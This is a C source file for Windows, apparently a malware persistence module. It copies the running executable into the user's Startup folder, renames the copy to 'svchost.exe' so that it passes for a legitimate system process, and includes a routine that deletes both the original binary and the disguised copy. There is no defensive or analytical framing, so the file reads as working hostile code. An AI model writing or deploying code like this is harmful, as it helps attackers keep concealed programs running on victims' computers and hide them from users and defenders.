#include <windows.h>
#include <shlobj.h> 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "startup.h"

void rename_file_in_startup();

int file_exists(const char *path) {
    FILE *file = fopen(path, "r");
    if (file) {
        fclose(file);
        return 1; 
    }
    return 0; 
}

void get_file_name_from_path(const char *path, char *file_name) {
    const char *last_backslash = strrchr(path, '\\');
    if (last_backslash != NULL) {
        strcpy(file_name, last_backslash + 1); 
    } else {
        strcpy(file_name, path);
    }
}

void copy_file_to_startup() {
    char currentFilePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);

    char startupFolder[MAX_PATH];
    if (SHGetSpecialFolderPathA(NULL, startupFolder, CSIDL_STARTUP, FALSE)) {
        char fileName[MAX_PATH];
        get_file_name_from_path(currentFilePath, fileName);

        char destinationPath[MAX_PATH];
        snprintf(destinationPath, MAX_PATH, "%s\\%s", startupFolder, fileName);

        if (!file_exists(destinationPath)) {
            if (CopyFileA(currentFilePath, destinationPath, FALSE)) {
                printf("File copied to Startup successfully.\n");
                rename_file_in_startup();
            } else {
                printf("Error while copying file: %d\n", GetLastError());
            }
        } else {
            printf("File already exists in Startup.\n");
        }
    } else {
        printf("Error: Could not get Startup folder path.\n");
    }
}

void delete_file_from_startup() {
    char currentFilePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);  

    if (DeleteFileA(currentFilePath)) {
        printf("File deleted successfully: %s\n", currentFilePath);
    } else {
        printf("Error deleting file: %s. Error code: %d\n", currentFilePath, GetLastError());
    }


    char startupFolder[MAX_PATH];
    if (SHGetSpecialFolderPathA(NULL, startupFolder, CSIDL_STARTUP, FALSE)) {
        const char *targetFileName = "svchost.exe";

        char targetFilePath[MAX_PATH];
        snprintf(targetFilePath, MAX_PATH, "%s\\%s", startupFolder, targetFileName);

        if (DeleteFileA(targetFilePath)) {
            printf("File %s deleted from Startup.\n", targetFileName);
        } else {
            printf("Error: Failed to delete file %s from Startup. Error code: %d\n", targetFileName, GetLastError());
        }
    } else {
        printf("Error: Could not get Startup folder path.\n");
   
    }
} 
void rename_file_in_startup() {
    char currentFilePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
    char startupFolder[MAX_PATH];
    if (SHGetSpecialFolderPathA(NULL, startupFolder, CSIDL_STARTUP, FALSE)) {
        char fileName[MAX_PATH];
        get_file_name_from_path(currentFilePath, fileName);

        char destinationPath[MAX_PATH];
        snprintf(destinationPath, MAX_PATH, "%s\\%s", startupFolder, fileName);
        if (file_exists(destinationPath)) {
            char newFilePath[MAX_PATH];
            snprintf(newFilePath, MAX_PATH, "%s\\%s", startupFolder, "svchost.exe");
            if (file_exists(newFilePath)) {
                if (DeleteFileA(newFilePath)) {
                    printf("Old file with the same name deleted successfully.\n");
                } else {
                    printf("Error while deleting old file: %d\n", GetLastError());
                }
            }
            if (MoveFileA(destinationPath, newFilePath)) {
                printf("File renamed successfully to: %s\n", newFilePath);
            } else {
                printf("Error while renaming file: %d\n", GetLastError());
            }
        } else {
            printf("File does not exist in Startup to rename.\n");
        }
    } else {
        printf("Error: Could not get Startup folder path.\n");
    }
}